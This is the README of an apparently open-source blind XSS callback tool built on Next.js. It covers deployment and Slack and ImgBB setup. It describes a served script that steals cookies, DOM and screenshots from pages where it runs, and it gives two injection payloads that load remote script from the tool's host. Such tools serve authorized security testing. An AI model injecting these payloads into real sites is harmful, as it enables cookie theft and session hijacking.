# Xless (Next.js Edition)

The Serverless Blind XSS App, now powered by Next.js and the App Router.

## Features
- **Modern Architecture**: Built with Next.js 14 and TypeScript.
- **Unified Backend**: API routes handle data exfiltration and OOB alerts.
- **Dashboard**: Simple landing page to check setup status and generate payloads.
- **Slack Integration**: Get real-time notifications for every callback.
- **Screenshots**: Automatically captures screenshots via ImgBB.

## Deployment

### Vercel (Recommended)
1. Push this repository to GitHub.
2. Connect your repository to [Vercel](https://vercel.com).
3. Add Environment Variables:
    - `SLACK_INCOMING_WEBHOOK`: Your Slack Incoming Webhook URL.
    - `IMGBB_API_KEY`: Your ImgBB API key (optional).
4. Deploy!

### Local Development
1. Clone the repo.
2. Run `npm install`.
3. Create a `.env.local` file with your keys.
4. Run `npm run dev`.

## Usage
Point your XSS payloads to any path under `/api/` (e.g., `https://your-app.vercel.app/api/x`).
Xless will:
1. Alert you in Slack that an OOB callback was triggered.
2. Serve the `payload.js` script.
3. Once executed on the target, exfiltrate cookies, DOM, and a screenshot back to `/api/c`.
4. Send a detailed Blind XSS report to Slack.

## Examples
- `<script src="https://your-app.vercel.app/api/payload"></script>`
- `javascript:eval('var a=document.createElement(\'script\');a.src=\'https://your-app.vercel.app/api/payload\';document.body.appendChild(a)')`
